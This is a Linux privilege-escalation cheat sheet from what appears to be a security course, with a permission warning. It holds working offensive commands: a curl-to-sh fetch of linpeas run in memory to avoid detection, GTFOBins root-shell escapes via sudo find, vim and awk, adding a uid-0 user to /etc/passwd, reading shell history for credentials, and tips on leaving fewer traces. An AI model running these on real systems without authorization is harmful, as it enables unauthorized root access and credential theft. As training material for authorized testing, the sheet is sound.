---
template: cheatsheet.html
hide:
  - navigation
  - toc
---

# Cheat sheet — Linux Privilege Escalation

*Companion to [Module 10 — Privilege Escalation: Linux](README.md) · CC BY 4.0 — print it, pin it, share it.*

*Last reviewed: 2026-07*

> Only enumerate and escalate on systems you own or have explicit written permission to test.

## Orient — who am I, what can I reach

```bash
id                                # uid/gid and groups (docker/lxd/disk/sudo are gold)
sudo -l                           # what can I run as root WITHOUT a password? (check first)
hostname; uname -a                # kernel version (for kernel-exploit hunting, last resort)
cat /etc/os-release
env; cat ~/.bash_history          # leaked creds, tokens, paths
```

## Automated enumeration — linpeas & pspy

```bash
# linpeas — run in memory, don't drop it to disk on a monitored host
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
./linpeas.sh -a > linpeas.txt     # -a = all checks; redirect and read (red/yellow = likely wins)

# pspy — watch processes/cron WITHOUT root (catches root cron jobs & their commands)
./pspy64                          # leave it running, trigger the target, read what root runs
./pspy64 -pf -i 1000              # print cmdline + file events, poll every 1s
```

## Find the classic misconfigurations by hand

```bash
# SUID/SGID binaries — run as the file OWNER (root); cross-ref against GTFOBins
find / -perm -4000 -type f 2>/dev/null          # SUID
find / -perm -6000 -type f 2>/dev/null          # SUID or SGID
getcap -r / 2>/dev/null                          # file capabilities (cap_setuid = instant root)

# writable things that root trusts
find / -writable -type d 2>/dev/null             # world-writable dirs
cat /etc/crontab; ls -la /etc/cron.*             # scheduled jobs (writable script = code exec as root)
find / -writable ! -user $(whoami) 2>/dev/null | grep -vE '^/proc|^/sys'
```

## GTFOBins — turn an allowed binary into a shell

```bash
# The pattern: you have a binary via sudo/SUID; GTFOBins tells you the escape.
sudo find . -exec /bin/sh \; -quit         # find with sudo -> root shell
sudo vim -c ':!/bin/sh'                    # editors shell out
sudo awk 'BEGIN {system("/bin/sh")}'
# SUID variant — spawn preserving euid:
./somebinary -p ...                        # (per the GTFOBins "SUID" section for that binary)
```

Always look the exact binary up at gtfobins.github.io — the escape differs per binary and per capability (sudo / SUID / capabilities / limited-shell).

## Common wins in one place

```bash
# writable /etc/passwd -> add a root user
openssl passwd -1 -salt x pass123          # make a hash, append user with uid 0
# PATH hijack when a root script calls a binary by bare name from a writable PATH dir
# LD_PRELOAD if sudo -l shows env_keep+=LD_PRELOAD
```

## Gotchas worth remembering

- **Privesc is misconfiguration, not exploits.** The same list a CIS benchmark audits — SUID sprawl, writable cron, loose sudo rules — is exactly what you're reading from the attacker's end. Kernel exploits are a noisy, box-crashing last resort.
- **`sudo -l` is the highest-value first command.** A single `NOPASSWD` entry for the wrong binary is often the whole box — check it before you run a 3-minute linpeas scan.
- **linpeas is a lead generator, not an answer.** It flags *candidates* in red/yellow; you still confirm each is exploitable (does that SUID binary have a GTFOBins entry? is that cron script actually writable by you?).
- **pspy is the quiet superpower.** Root cron jobs and their full command lines are invisible to `ps` as a normal user but visible to pspy — that's how you catch a script running as root that you can influence.
- **You are loud on disk.** Dropping linpeas.sh, world-readable output files, and shelling out of SUID binaries all leave artifacts. Run enumeration from memory and clean up your temp files.
